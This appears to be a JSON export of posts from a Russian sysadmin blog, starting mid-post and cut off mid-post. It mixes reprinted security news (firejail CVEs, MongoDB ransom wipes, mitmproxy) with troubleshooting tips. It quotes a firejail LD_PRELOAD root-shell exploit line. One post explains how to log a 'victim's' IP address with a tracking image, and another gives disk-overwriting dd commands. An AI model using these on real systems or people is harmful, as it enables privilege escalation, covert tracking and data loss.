(X-сервер запускается с правами root) - \"firejail --x11=xorg --env=LD_PRELOAD=$PWD/rootshell.so\". В дополнение было выявлено ещё две уязвимости: выход из изолированного окружения через ptrace при запуске в режиме \"--allow-debuggers\" ([CVE-2017-5207](http://openwall.com/lists/oss-security/2017/01/07/3)) и выполнение кода с правами root через [манипуляции](https://github.com/netblue30/firejail/issues/1023) с опциями --bandwidth и --shell ([CVE-2017-5206](http://openwall.com/lists/oss-security/2017/01/07/5)).\n\nДополнение: [Вышли](https://firejail.wordpress.com/download-2/release-notes/) обновления [firejail 0.9.38.8 и 0.9.44.4](https://github.com/netblue30/firejail/releases), в которых устранены три опасные уязвимости (CVE-2017-5207, CVE-2017-5206, CVE-2017-5180). \n\n![](https://firejail.files.wordpress.com/2015/12/firetools-main.png?w=625&h=464)\n\n[opennet](http://www.opennet.ru/opennews/art.shtml?num=45824)\n"
		},
		{
			"post_id": 19,
			"title": "Вымогатели-шифровальщики переключились на незащищённые СУБД MongoDB",
			"date_published": 1483879509.368,
			"body": "В Сети [зафиксирована](https://medium.com/@mbromileyDFIR/its-10pm-do-you-know-where-your-mongodb-is-a83b8a55ab12#.k2lb1cj7r) новая атака на серверы с СУБД MongoDB, доступные без аутентификации. [Выявлено](https://twitter.com/achillean/status/816385533538631680) около 2000 поражённых систем, на которых имеющиеся данные были удалены, а в БД добавлена таблица \"WARNING_ALERT\", содержащая запись с требованием выплатить 0.2 или 0.5 Bitcoin ($200 или $550) за восстановление информации. В сообщении утверждается, что данные зашифрованы, но на деле они просто [удалены](https://twitter.com/0xDUDE/status/816798596997726209). При этом, в некоторых случаях в логе зафиксирован экспорт данных перед удалением.\n\n![](https://www.opennet.ru/opennews/pics_base/0_1483601344.jpg)\n---\nСреди поражённых оказались конфигурации MongoDB, доступные для сетевых соединений извне и не использующие аутентификацию доступа. Подобная особенность связана с тем, что до версии 3.0 в MongoDB по умолчанию предлагались настройки, подразумевающие присоединение ко всем сетевым интерфейсам без включения аутентификации. В MongoDB 3.0 по умолчанию была осуществлена привязка к localhost, но многие системы, обновившиеся с MongoDB 2.x, сохранили прежние настройки в конфигурации, а привязка к внешним сетевым интерфейсам осталась незамеченной. Например, до сих пор [остаётся открыта база](https://twitter.com/0xDUDE/status/815293674011693056/photo/1) одного из крупных операторов сотовой связи c данными о звонках абонентов, содержащая более 853 миллиардов записей.\n\nЕсли раньше подобная [беспечность приводила](https://www.opennet.ru/opennews/art.shtml?num=41661)  к [утечке](https://www.opennet.ru/opennews/art.shtml?num=43540) данных, например данный способ использовался для захвата учётных записей 13 миллионов пользователей программы MacKeeper, то теперь злоумышленники перешли к применению шантажа, надеясь заработать на серверных системах с ненадлежащим резервным копированием (расчёт сделан на то, что проблема будет выявлена администраторами после праздников, а за выходные резервные копии с реальными данными могут быть вытеснены новыми резервными копиями).\n\nС проблемой уже столкнулось одно из учреждений здравоохранения США, у которого оказался блокирован доступ к 200 тысячам записям пациентов. Всем администраторам MongoDB рекомендуется [проверить](https://docs.mongodb.com/manual/administration/security-checklist/) привязку к сетевым интерфейсам, заблокировать внешний доступ к сетевому порту 27017 и [включить](https://docs.mongodb.com/manual/tutorial/enable-authentication/) доступ с применением аутентификации (запуск с \"--auth\" или добавление в настройки \"security.authorization\"), который не активирован по умолчанию. \n\n[opennet](http://www.opennet.ru/opennews/art.shtml?num=45817)"
		},
		{
			"post_id": 18,
			"title": "О том, как провайдер Обит подменяет сертификаты на mail.yandex.ru",
			"date_published": 1483803849.183,
			"body": "![Вот так подменяется сертификат у Обит](http://storage1.static.itmages.com/i/17/0107/h_1483830015_5907956_52e3ee03d7.png \"\")\n\ntraceroute mail.yandex.ru\ntraceroute to mail.yandex.ru (93.158.134.25), 30 hops max, 60 byte packets\n1 gateway (192.168.0.1) 3.136 ms 3.099 ms 3.600 ms\n2 10.23.18.1 (10.23.18.1) 7.244 ms 7.237 ms 7.221 ms\n3 10.23.0.14 (10.23.0.14) 4.252 ms 4.650 ms 7.069 ms\n4 ae-00-0176.brc1.spb.obit.ru (85.114.26.241) 7.080 ms 7.076 ms 7.082 ms\n5 ge-00-1880.cnsr.spb.obit.ru (85.114.3.167) 7.028 ms 6.974 ms 6.968 ms\n6 vi-xx-1874.brc1.spb.obit.ru (85.114.3.168) 6.950 ms 16.833 ms 16.833 ms\n7 xe133-144.RT.OV.SPB.RU.retn.net (87.245.250.65) 4.553 ms 7.728 ms 8.137 ms\n8 ae2-9.RT.MR.MSK.RU.retn.net (87.245.233.13) 30.191 ms 30.182 ms 30.128 ms\n9 GW-Yandex.retn.net (87.245.253.122) 29.980 ms 29.963 ms 29.935 ms\n10 std-p2-be12.yndx.net (87.250.239.65) 29.922 ms 29.940 ms 29.916 ms\n11 ugr-b-c1-ae1.yndx.net (87.250.239.47) 11.720 ms ugr-b-c1-ae13.yndx.net (87.250.239.86) 29.837 ms ugr-b-c1-ae14.yndx.net (87.250.239.83) 11.596 ms\n12 mail.yandex.ru (93.158.134.25) 29.598 ms 12.612 ms 37.653 ms"
		},
		{
			"post_id": 17,
			"title": "Лечение зависающих карточек в vTigerCRM",
			"date_published": 1483801412.998,
			"body": "исправить /var/www/html/vtigercrm/modules/PBXManager/models/Record.php\n\n````\n    /**\n     * Function to get call details(polling)\n     * return <array> calls\n     */\n    public function searchIncomingCall(){\n        $db = PearDatabase::getInstance();\n        $query = 'SELECT * FROM '.self::moduletableName.' AS module_table INNER JOIN '.self::entitytableName.' AS entity_table  WHERE module_table.callstatus IN(?,?) AND module_table.direction IN(?,?) AND module_table.pbxmanagerid=entity_table.crmid AND entity_table.deleted=0';\n        $result = $db->pquery($query,array('ringing','in-progress','inbound','outbound'));\n        $recordModels = array();\n        $rowCount =  $db->num_rows($result);\n        for($i=0; $i<$rowCount; $i++) {\n            $rowData = $db->query_result_rowdata($result, $i);\n            \n            $record = new self();\n            $record->setData($rowData);\n            $recordModels[] = $record;\n            \n            //To check if the call status is 'ringing' for >5min\n            $starttime = strtotime($rowData['starttime']);\n            $currenttime = strtotime(Date('y-m-d H:i:s'));\n            $timeDiff = $currenttime - $starttime;\n            if($timeDiff > 300 && ($rowData['callstatus'] == 'ringing' OR $rowData['callstatus'] == 'in-progress')) {\n                $recordIds[] = $rowData['crmid'];\n            }\n            //END\n        }    \n        \n        if(count($recordIds)) $this->updateCallStatus($recordIds);\n        \n        return $recordModels;\n    }\n    \n    /**\n     * To update call status from 'ringing' to 'no-response', if status not updated \n     * for more than 5 minutes\n     * @param type $recordIds\n     */\n    public function updateCallStatus($recordIds) {\n        $db = PearDatabase::getInstance();\n        $query = 'UPDATE '.self::moduletableName.' SET callstatus=\"no-response\" \n                  WHERE pbxmanagerid IN ('.generateQuestionMarks($recordIds).') \n                  AND callstatus=\"ringing\" OR callstatus=\"in-progress\"';\n        $db->pquery($query, $recordIds);\n    }\n````"
		},
		{
			"post_id": 16,
			"title": "virt-manager: Unable to connect to libvirt",
			"date_published": 1483747209.582,
			"body": "Диагноз:\n>authentication failed: polkit\\56retains_authorization_after_challenge=1\n>Authorization requires authentication but no agent is available.\n>\n>Verify that the 'libvirtd' daemon is running\n>on the remote host.\n>\n>Details:\n>Unable to connect to libvirt.\n>\n>authentication failed: polkit\\56retains_authorization_after_challenge=1\n>Authorization requires authentication but no agent is available.\n\nспособ решения:\n````\n#!/bin/bash\n\nprg=$1\n\n[ \"$prg\" ] || exec echo \"missing argument\"\n[ -x \"$prg\" ] || which $prg &>/dev/null || exec echo \"program not found: $1\"\n\nshift\nargs=$*\n\n[ `id -u` -eq 0 ] && exec $prg $args\n\nuname -m | grep -q 64 && lib=lib64 || lib=lib\n\nif [ \"$DESKTOP_SESSION\" = \"kde-plasma\" ]; then.\n        pga=polkit-kde-authentication-agent-1\n        lpga=/usr/$lib/kde4/libexec/$pga\nelse\n        pga=polkit-gnome-authentication-agent-1\n        lpga=/usr/lib/$pga\nfi\n\ncase $DESKTOP_SESSION in\n        gnome|gnome-shell|cinnamon*) exec $prg $args ;;\n        *) ps nc -C $pga &>/dev/null && exec $prg $args || { [ ! -x $lpga ] && exec echo \"program not found: $lpga\" || $lpga & $prg $args ;} ;;\nesac\n````\n\nКопируем этот скрипт в /usr/bin и называем \"polkitexec\"\n\n````\nchmod +x /usr/bin/polkitexec\n````\n\nзапускаем так: \n\n````\n$ polkitexec virt-manager\n````"
		},
		{
			"post_id": 15,
			"title": "CentOS - исправление авторизации в SSH по public key",
			"date_published": 1483708630.684,
			"body": "В CentOS от 6.2 до 6.8 и ROSA Enterpise Linux Server 6.6 существует проблема с авторизацией по public key. Исправление описано в этом блоге: \n\n[Блог Админа](http://blog.tataranovich.com/2012/01/centos-62-ssh-public-key.html)\n---\nЧто бы не забыть копипастю сюда: \n\n\nПосле установки CentOS 6.2 на тестовый сервер, попробовал закинуть свой SSH public key:\n\n>$ ssh-copy-id -i .ssh/id_dsa root@newserver\n>root@newserver 's password:\n>Now try logging into the machine, with \"ssh centos62-mysql-master\", and check in:\n>\n >.ssh/authorized_keys\n>\n>to make sure we haven't added extra keys that you weren't expecting.\n\nПосле чего споткнулся об запрос пароля, при попытке зайти на сервер под root@newserver.\n\n>$ ssh root@newserver\n>root@newserver's password:\n\n\nЗашел по паролю и проверил содержимое /root/.ssh/authorized_keys - публичная часть ключа была на месте. Подозрение пало на SELiux, который был в режиме enforcing и не первый раз становился виновником мифических глюков. Перевел SELinux в permissive режим:\n\n``# setenforce Permissive``\n\nПосле чего заработал логин по ключу. По запросу \"centos 6.2 ssh public key selinux\" в гугле нашелся Release Notes для CentOS 6.2, где в разделе Known Issues описывается проблема с SSH public key и SELinux.\n\nMake sure that you setup correctly the selinux context of the public key if you transfer it to a CentOS 6 server with selinux enabled. Otherwise selinux might forbid access to the ~/.ssh/authorized_keys file and by matter of consequence key authentication will not work. In order to setup the correct context you can use:\n\n``\nrestorecon -R -v /home/$ACCOUNT/.ssh\n``\n\nssh-copy-id from CentOS 6 is aware of selinux contexts and the previous workaround is not needed.\n\nПосле выполнения \n\n``# restorecon -R -v /root/.ssh``\n\nлогин через publickey заработал как положено."
		},
		{
			"post_id": 14,
			"title": "Как загрузить пакеты через yum",
			"date_published": 1483707043.303,
			"body": "Иногда возникает потребность в загрузке пакетов без их установки. \n``\nyum install --downloadonly <package>\n``\nне всегда работает, потому нужен другой подход:\n\n``\nyum install yum-utils\n``\n\nдалее:\n``\nyumdownloader <package>\n``\n\nвзято отсюда: [redhat](https://access.redhat.com/solutions/10154)"
		},
		{
			"post_id": 13,
			"title": "Наиболее важные события 2016 года в жизни OpenSource",
			"date_published": 1483308228.868,
			"body": "Итоговая подборка наиболее важных и заметных событий 2016 года:\n\nНовые платформы и операционные системы: AsteroidOS (открытая ОС для умных часов),Maru OS (рабочее окружение для смартфонов, сочетающее Android и Debian GNU/Linux), Android Things (ОС для интернета вещей), Minoca (для потребительских интернет-устройств), Fuchsia (новая открытая ОС от Google), DC/OS (Datacenter Operating System), Civil Infrastructure Platform и Zephyr (ОС для IoT) от Linux Foundation;\n---\nБурное развитие проектов, связанных с искусственным интеллектом и машинным обучением: платформы Universe от проекта OpenAI и DeepMind Lab для тренировки AI в компьютерных играх и приложениях. Facebook открыл код библиотеки классификации текста fastText и наработки по распознаванию объектов на фотографиях. Открыты наработки Baidu в области машинного обучения. Yahoo открыл модель машинного обучения для выявления неприличных изображений. Google открыл код SyntaxNet, системы восприятия естественного языка. Microsoft опубликовал систему машинного обучения CNTK\n\nFacebook опубликовал реализацию алгоритма сжатия Zstandard. Компания Apple открыла реализацию алгоритма сжатия без потерь LZFSE. Dropbox опубликовал реализацию алгоритма сжатия изображений Lepton;\nFacebook запустил проект по созданию открытого оборудования для сотовых сетей. Открытый 3G-стек Osmocom достиг возможности совершения голосовых звонков. В Debian добавлены пакеты для развёртывания GSM-сети;\n\nВ Fedora по умолчанию предложен сеанс GNOME на базе Wayland. Значительные успехи в обеспечении работы KDE Plasma 5 поверх Wayland, включение KWayland в состав KDE Frameworks;\n\nОпубликован графический стандарт Vulkan 1.0. Компания AMD ввела в строй проект GPUOpen. В Mesa обеспечена поддержка OpenGL 4.5. Изменён метод разработки GTK+ и начата подготовка к выпуску GTK+ 4; Представлен проект Qt Lite, позволяющий формировать сборки Qt, содержащие только необходимые компоненты; \n\nКритические уязвимости: Локальные root-уязвимости в ядре Linux. Уязвимости, позволяющие выйти из окружений виртуализации и контейнеров. Уязвимость, позволяющая вклиниться в стороннее TCP-соединение. Серия уязвимостей, демонстрирующих опасность автоматической обработки мультимедийных файлов на рабочем столе. Root-уязвимость в MySQL. Серия критических уязвимостей в GraphicsMagick и ImageMagick. Уязвимость Badlock в Samba. Уязвимость MouseJack. Опасная уязвимость в Glibc.\n\nНовые атаки: Обход защиты ASLR на процессорах Intel. Атака DROWN на SSL/TLS, которой подвержены 33% HTTPS-сайтов. Атака SLOTH, затрагивающая протоколы TLS 1.2, SSH и IKE/IPsec с MD5 и SHA-1. Атака Sweet32 на HTTPS и OpenVPN. Атака на заблокированный ПК через USB. Волна атак на клиентские маршрутизаторы. Метод скрытого изменения памяти чужих виртуальных машин;\n\nВзломы инфраструктуры BitTorrent-клиента Transmission, серверов хранения данных синхронизации Opera, форума Ubuntu, инфраструктуры Linux Mint, уязвимость в инфраструктуре Fedora;\nЗапуск некоммерческого удостоверяющего центра Lets'Encrypt. Попытка Comodo завладеть брендом Let's Encrypt. Реализация ограничений в отношении сертификатов, выданных удостоверяющими центрами WoSign и StartCom, из-за серии инцидентов с безопасностью. Уязвимость удостоверяющего центра StartSSL;\n\nОрганизация атак для деанонимизации пользователей Tor Browser;\nИнцидент с захватом прав на NPM-модуль. Незащищённость NPM к атакам по внедрению вредоносных модулей-червей;\n\nНовые технологии защиты от атак с использованием заимствования кусков кода от grsecurity и OpenBSD. Открытие компанией Intel компонентов для использования в Linux технологии SGX для изоляции кода и данных приложения. Переход OpenBSD на обязательное использование механизма защиты W^X;\n\nРазвитие систем шифрования: Новая TLS-библиотека BearSSL. Проведён аудит VeraCrypt. Представлен WireGuard, новый VPN для Linux. Релиз свободного безопасного цензуроустойчивого VPN-демона GoVPN 5.0. Новая система анонимных коммуникаций Riffle;\n\nZeroNet - технология децентрализованных сайтов, которые невозможно закрыть;\n\nПрототип защищённого смартфона на платформе Android от проекта Tor, основанный на CopperheadOS;\n\nРазвитие средств виртуализации и изоляции: новая ОС Subgraph, использующая контейнерную изоляцию приложений на десктопе. Релизы систем управления контейнерами LXC 2.0, LXD 2.0, rkt 1.0, Xen 4.7/4.8 и OpenVZ 7.0. Cilium, новая сетевая система для Linux-контейнеров на базе BPF. Первый выпуск гипервизора Bareflank. Гипервизор prplHypervisor, разработанный для процессоров MIPS.\n\nАктивное продвижение систем для работы с самодостаточными пакетами программ, не зависящих от дистрибутивов: Canonical развивает универсальные пакеты snap. Проект xdg-app переименован во flatpak. Первый выпуск Flatpak. Новый формат самодостаточных универсальных пакетов Habitat. Разработка Limba приостановлена в пользу Flatpak. Новые выпуски Firejail. Анализ проблем из-за самодостаточного распространения приложений для Linux. \n\nРасширение возможностей ядра Linux (4.4, 4.5, 4.6, 4.7, 4.8, 4.9). Средства трассировки в ядре Linux достигли уровня DTrace. Создание механизма межпроцессных коммуникаций Bus1, который пришёл на смену так и не добавленного в ядро kdbus. Новый планировщик задач MuQSS от автора BFS. Для Ubuntu реализован механизм обновления ядра без перезагрузки;\nНовые версии языков программирования и компиляторов: Python 3.6, PHP 7.1, LLVM 3.8 и 3.9, GCC 6, Swift 3.0 с поддержкой Linux, TypeScript 2.0;\nНовые свободные шрифты: для офисных документов от проектов МойОфис и Astra Linux, для разработчиков от проекта Go. Google опубликовал наработки по поддержке изменчивых шрифтов OpenType;\n\nНовые версии значимых дистрибутивов и OS: FreeBSD 11, OpenBSD 6.0, Android 7.0 и 7.1, Fedora 24 и 25, SUSE Linux Enterprise 12 SP2, Red Hat Enterprise Linux 7.3, openSUSE Leap 42.2, Ubuntu 16.04 LTS и 16.10, Slackware 14.2, OpenMandriva Lx 3.0;\n\nНовые версии программ: Vim 8.0, Asterisk 14, LibreOffice 5.1 и 5.2. Первый релиз интегрированной среды разработки Eclipse Che;\nНовый высокопроизводительный HTTP-сервер Lwan;\nОткрытие анимационного пакета Toonz, применяемого в производстве Футурамы;\n\nНовые СУБД и системы хранения: децентрализованная СУБД Noms, основанная на идеях Git, распределённая система хранения Torus, распределённая СУБД CitusDB, встраиваемая СУБД TrailDB, графо-ориентированная СУБД Dgraph, движок хранения MyRocks от Facebook, СУБД InfluxDB 1.0, СУБД CrateDB 1.0. В 2016 году также были выпущены PostgreSQL 9.6, Redis 3.2 и Firebird 3.0. Прекратила своё существование компания, развивающая СУБД RethinkDB;\n\nОбновления рабочих столов: Cinnamon 3.0 и 3.2, Lumina 1.0 и 1.1, GNOME 3.20 и 3.22, MATE переходит на GTK3+, MATE 1.14 и 1.16, Enlightenment 0.21, LXQt 0.11 Новое окружение PIXEL от проекта Raspberry Pi. Новый дисплейный сервер Arcan и десктоп-окружение Durden;\nGoogle открыл код SwiftShader, программной реализации OpenGL ES и Direct3D 9;\n\nПроект KDE запустил каталог-магазин приложений KDE Store, опубликовал LTS-ветку Plasma 5.8, опубликовал новый фреймворк для построения интерфейса Kirigami UI. Бывший лидер Kubuntu основал проект KDE Neon.\nОткрыты исходные тексты системы управления версиями BitKeeper; \n\nWeb-технологии: Стандарт HTML 5.1, ECMAScript 7, широкомасштабное тестирование технологии WebAssembly в Chrome, Firefox и Edge. Новый пакетный менеджер Yarn для JavaScript.\n\nВыпуск Electron 1.0, платформы создания приложений на базе движка Chromium и достаточно активное создание проектов на её основе (например, Skype, клиент Wire, Visual Studio Code, редактор Atom);\nChrome начнёт помечать небезопасными страницы, открытые по HTTP. В Chrome добавлены средства шифрования, стойкие к подбору на квантовом компьютере. В Chrome OS появилась возможность запуска всех Android-программ из Google Play;\n\nРазвитие Firefox: интеграция Firebug с Firefox, прекращение поддержки NPAPI, начало перехода на технологию разработки дополнений WebExtensions и план по отказу от XUL, внедрение многопроцессной модели, реализация многопроцессной обработки контента, проект Quantum по переносу наработок Servo в Firefox. Проект по переносу PDFium и части Pepper API из Chromium в Firefox;\n\nНовый браузер Brave от создателя JavaScript и бывшего руководителя Mozilla. Разработчики Qt представили мобильный web-браузер Qt WebBrowser. Браузер Tofino, использующий движок Chromium, созданный для экспериментов над развитием интерфейса Firefox.\nПрекращение разработки Firefox OS; \n\nВоссоединение сообществ Arduino.org и Arduino.cc после раскола;\nРазрыв отношений между компаниями Seafile Ltd и Seafile GmbH, ранее сообща развивающих проект Seafile, а теперь переключившиеся на собственные ветки;\n\nАктивные разработчики OpenWrt основали форк дистрибутива - LEDE (сейчас в рассылках уже обсуждается слияние OpenWrt и LEDE);\nВ рамках проекта ImageFlow началось развитие высокопроизводительной альтернативы ImageMagick;\n\nSourceForge и Slashdot проданы компании BIZX;\nLibreboot вошел в число проектов GNU, после чего из-за конфликта попытался уйти, но не был отпущен. Раскол проекта Nano при попытке его вывода из состава GNU (позднее конфликт был улажен). GitHub и SourceForge признаны неприемлемыми для размещения кода проектов GNU.\nКлючевые разработчики облачной платформы ownCloud создали форк Nextcloud и выпустили его значительный релиз.\n\nБета-выпуски Devuan, форка Debian без systemd;\n\nПрекратил своё существование проект CyanogenMod, команда разработчиков переключилась на развитие форка Lineage OS.\nВопрос блокировки альтернативных прошивок после изменения требований FCC: TP-Link начала блокировать возможность применения альтернативных прошивок, но затем заявила о нахождении пути вернуть поддержку альтернативных прошивок. В Linksys WRT продолжена поддержка свободных прошивок при новых требованиях FCC. Для MIPS-устройств разработан метод соблюдения требований FCC для использования свободных прошивок.\n\nСближение Microsoft с миром открытого ПО: присоединение к Linux Foundation, тестовый выпуск SQL Server для Linux, добавление в Windows 10 поддержки запуска исполняемых файлов Linux, открытие Linux-системы для сетевых коммутаторов, открытие кода PowerShell, открытие и портирование для Linux JavaScript-движка ChakraCore, который используется в браузере Edge. Началось открытие проприетарных наработок компании Xamarin. Компания Microsoft свернула проект RoboVM, разработка продолжена сообществом в рамках форка BugVM;\nПрекращение существования дистрибутива Mythbuntu;\n\nСмена лицензии DNS-сервера BIND 9.11 с ISC на MPL;\n\nК проекту GNU присоединился децентрализованный коммуникационный клиент Ring;\n\nКонфликт между Software Freedom Conservancy и Canonical, связанный с вопросом нарушения лицензии GPL при поставке модуля ZFS в Ubuntu; \n\nAdblock Plus запустил собственную рекламную сеть с приемлемой рекламой;\n\nПроект GNU представил собственную платёжную систему GNU Taler. Новая криптовалюта Zcash, обеспечивающая анонимность транзакций;\nОбсуждение возможного сворачивания проекта Apache OpenOffice;\n\nПроект PC-BSD переименован в TrueOS и перешёл к rolling-модели подготовки обновлений на основе FreeBSD CURRENT;\n\nAdobe возобновил выпуск NPAPI-плагина с Flash Player для Linux. Chrome и Firefox вводят ограничения по воспроизведению некоторых видов Flash-контента.\n\nGoogle одержал победу над Oracle в разбирательстве, связанном с использованием Java API в Android\nOracle передаёт среду разработки NetBeans сообществу Apache и прекращает поставку браузерного Java-плагина;\n\nПроекту OpenNET.ru исполнилось 20 лет.\n\n[opennet](http://www.opennet.ru/opennews/art.shtml?num=45791)"
		},
		{
			"post_id": 12,
			"title": "Выпуск mitmproxy 1.0, инструмента для анализа трафика HTTP/HTTPS",
			"date_published": 1482850480.949,
			"body": "После шести лет разработки [представлен](https://corte.si/posts/code/mitmproxy/announce_1_0/index.html) релиз проекта [mitmproxy 1.0](https://mitmproxy.org/), в рамках которого развивается инструментарий для исследователей безопасности и разработчиков приложений, позволяющий отслеживать активность в рамках транзитных HTTP- и HTTPS-соединений. Mitmproxy может рассматриваться как специализированный инструмент, рассчитанный на перехват трафика внутри соединений, установленных по HTTPS, с возможностями по его инспектированию, модификации и повторному воспроизведению. Исходные тексты проекта написаны на языке Python и [распространяются](https://github.com/mitmproxy/mitmproxy) под лицензией MIT.\n---\nДля анализа HTTPS mitmproxy [размещается](http://docs.mitmproxy.org/en/stable/howmitmproxy.html) на транзитном узле, на котором перехватывает запросы клиента и транслирует их в отправляемые от себя запросы к серверу. С запрошенным в процессе клиентского сеанса сервером mitmproxy устанавливает обычное HTTPS-соединение, а с клиентом от имени целевого хоста устанавливается фиктивное соединение с подставным SSL-сертификатом, который генерируется для клиента на лету. Принятый от клиента трафик перенаправляется целевому хосту, а получаемые ответы транслируются. Для того, чтобы подобный подставной сертификат не приводил к выводу браузером предупреждений о проблемах с безопасностью соединения, в систему пользователя предлагается установить корневой сертификат mitmproxy, что можно сделать как вручную, так и открыв в браузере специальный хост mitm.it.\n\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482834756.png \"\")\n\n\nСледует отметить, что основное назначение mitmproxy не проведение MITM-атак, а организация отслеживания трафика в корпоративных системах и диагностика проблем, например, отслеживание скрытой активности приложений. Для перенаправления трафика через mitmproxy поддерживается несколько методов, таких как указание адреса mitmproxy в качестве HTTP-прокси в настройках браузера, работа в виде SOCKS5-прокси, использование в роли обратного прокси перед HTTP-сервером и организация прозрачного проброса при помощи правил пакетного фильтра или заворачивания маршрутизации.\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482834704.png \"\")\n\nСистема поддерживает HTTP/2, Websockets, нормализацию порядка следования пакетов в потоке, подключение скриптов-обработчиков для модификации трафика на лету, сохранение запросов для дальнейшего повторного воспроизведения, генерацию TLS-сертификатов для перехваченных сеансов, чистку заголовков о времени модификации для отключения кэширования на стороне клиента.\n\nВ состав mitmproxy входит несколько компонентов:\n\n- mitmproxy - реализация прокси, выполняющего перехват соединений и разбор сеансов TLS/SSL.\n- mitmdump - утилита командной строки для анализа трафика, работающая по аналогии с tcpdump;\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482831639.png \"\")\n\n- pathoc и pathod - реализация обратных прокси (reverse proxy) для клиентов и серверов HTTP, позволяющих вносить изменения в содержимое HTTP-запросов и ответов (например, можно блокировать определённые запросы или подменять конфиденциальную информацию);\n- mitmweb - web-интерфейс для управления и анализа трафика через web-браузер.\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482831737.png \"\")\n\n![](https://www.opennet.ru/opennews/pics_base/0_1482844770.png \"\")\n\n[opennet](http://mobile.opennet.ru/opennews/art.shtml?num=45772)"
		},
		{
			"post_id": 11,
			"title": "Что соседи качают с torrent?",
			"date_published": 1482528781.725,
			"body": "http://iknowwhatyoudownload.com/ru/peer/ заходим, вбиваем IP, смотрим."
		},
		{
			"post_id": 10,
			"title": "Собираем IP с помощью картинки",
			"date_published": 1482528669.911,
			"body": "http://iplogger.ru/ генерим картинку, вставляем картинку в сообщение, желательно что бы жертва перешла по ссылке. IP будет зафиксирован.\n"
		},
		{
			"post_id": 9,
			"title": "FlexNet загрузочный и официальный руткит",
			"date_published": 1482510509.369,
			"body": "Столкнулся сегодня вот с таким сообщением на одной из машин с ROSA Linux:\n\n/usr/sbin/grub2-bios-setup: предупреждение: Сектор 32 уже используется программой «FlexNet»; пропускаем его. Данное ПО в будущем может создать проблемы с загрузкой. Попросите его авторов не хранить данные на загрузочной дорожке.\n/usr/sbin/grub2-bios-setup: предупреждение: Сектор 33 уже используется программой «FlexNet»; пропускаем его. Данное ПО в будущем может создать проблемы с загрузкой. Попросите его авторов не хранить данные на загрузочной дорожке.\nУстановка завершена. Ошибок нет.\n---\nУпс. \n\nв Интернетах на сей счет пишут вот что:\n[http://blacktorch.livejournal.com/1688.html](http://blacktorch.livejournal.com/1688.html)\n\n**FlexNet DRM**\n\nMar. 5th, 2012 at 3:00 AM\nFlexNet Publisher (FLEXlm) - техническое средство защиты данных (DRM, Digital Rights Managment). Реализует управление лицензиями на ПО в корпоративной среде. Была создана в 1988 году Flexera Software. Работает под Windows, MacOS, различными UNIX. Используется Adobe для защиты своих приложений.\n\nУстановленная FlexNet может вызывать проблемы загрузки и работы ОС, а так же проблемы при установке загрузчика (например, при установке GRUB2 сообщает о том что некоторый сектор занят FlexNet, причем система впоследствии может и не загрузиться), так как использует прямую запись в область MBR диска.\n\nПри использовании MBR резервируется 64 сектора с 0 по 63 (в EFI 2048). Загрузчик BIOS подгружает и исполняет код только из нулевого сектора (собственно MBR), его формат:\n440 байт кода загрузчика\n4 байта сигнатуры диска\n2 нулевых байта (0x0000)\n64 байта для таблицы разделов\n2 байта сигнатуры MBR (0x55AA)\nПервый раздел на большинстве машин начинается с сектора 63, посмотреть можно\n```\n/sbin/fdisk -lu /dev/sda\n/sbin/parted -l /dev/sda (для GPT)\n```\n\nПолучается, секторы с 1 по 62 не используются. Даже если оставшееся пространство будет использовано загрузчиком, или информацией о разделах, FlexNet все же способен перезаписать её. Проблемы могут возникнуть и при использовании шифрования \"на лету\" TrueCrypt.\n\nFlexNet является, по сути, руткитом, запускающий службу проверки лицензий, которая имеет доступ к системе на низком уровне. Она связывается с удаленным сервером, может отправлять и принимать данные, изменяя установленный софт.\n\nРешением при вышеупомянутых симптомах является зачистка области между MBR и первым разделом, например затирание '\\0' и затем переустановка загрузчика. Пока еще нет способа заставить GRUB переписать все неиспользуемые секторы.\n\nПеред выполнением обязательно сделать бэкап таблицы разделов:\n```\nsudo dd if=/dev/sda of=~/first_63_sectors bs=512 count=63\n```\n\nДалее, стереть секторы с 1 по 62:\n```\nsudo dd if=/dev/zero of=/dev/sda bs=512 count=62 seek=1\n```\n\nАльтернативный вариант, стереть только нужный сектор с номером n:\n```\nsudo dd if=/dev/zero of=/dev/sda bs=512 count=1 seek=n\n```\n\nТеперь можно выполнить\n```\ngrub-install /dev/sda\n```\n\nи еще:\n[http://www.filecheck.ru/process/fnplicensingservice.exe.html](http://www.filecheck.ru/process/fnplicensingservice.exe.html)\n\n**Как удалить FNPLicensingService**\n\nFNPLicensingService.exe - это исполняемый файл (программа) для Windows. Расширение имени файла .exe - это аббревиатура от англ. слова executable — исполнимый. Необходимо запускать исполняемые файлы от проверенных производителей программ, потому что исполняемые файлы могут потенциально изменить настройки компьютера или нанести вред вашему компьютеру. Бесплатный форум с информацией о файлах может помочь вам разобраться является ли FNPLicensingService.exe вирусом, трояном, программой-шпионом, рекламой, которую вы можете удалить, или файл принадлежит системе Windows или приложению, которому можно доверять.\n\nВот так, вы сможете исправить ошибки, связанные с FNPLicensingService.exe\n1. Используйте программу [Настройщик Windows](http://www.filecheck.ru/tools/pc-scan.html), чтобы найти причину проблем, в том числе и медленной работы компьютера.\n1. Обновите программу Activation Licensing Service. Обновление можно найти на сайте производителя (ссылка приведена ниже).\n1. В следующих пунктах предоставлено описание работы FNPLicensingService.exe.\n\nИнформация о файле FNPLicensingService.exe\nПроцесс [Activation Licensing Service](http://www.filecheck.ru/search.html?q=Activation+Licensing+Service) принадлежит программе [FLEXnet Publisher](http://www.filecheck.ru/search.html?q=FLEXnet+Publisher) (версия (32 bit)) или [FlexNet Publisher](http://www.filecheck.ru/search.html?q=FlexNet+Publisher) (версия (32 bit)) или [Activation Licensing Service](http://www.filecheck.ru/search.html?q=Activation+Licensing+Service) или [IBM Software Package Installer](http://www.filecheck.ru/search.html?q=IBM+Software+Package+Installer) или [BlackBerry Desktop Software](http://www.filecheck.ru/search.html?q=BlackBerry+Desktop+Software) или [BeyondTrust Privilege Manager](http://www.filecheck.ru/search.html?q=BeyondTrust+Privilege+Manager) или [STS Open - Database drivers от Macrovision Europe (www.macrovision.com)](http://www.filecheck.ru/search.html?q=STS+Open+-+Database+drivers) или [Acresso Software (www.flexerasoftware.com)](http://www.flexerasoftware.com/) или [Flexera Software](http://www.filecheck.ru/search.html?q=Flexera+Software).\n\nОписание: FNPLicensingService.exe – это служба обеспечивающая функции лицензирования для программных продуктов, предоставляемая FLEXNet Publisher. Это не отдельный процесс, он поставляется в комплекте со множеством программных продуктов, которые требуют активации лицензии. Он может 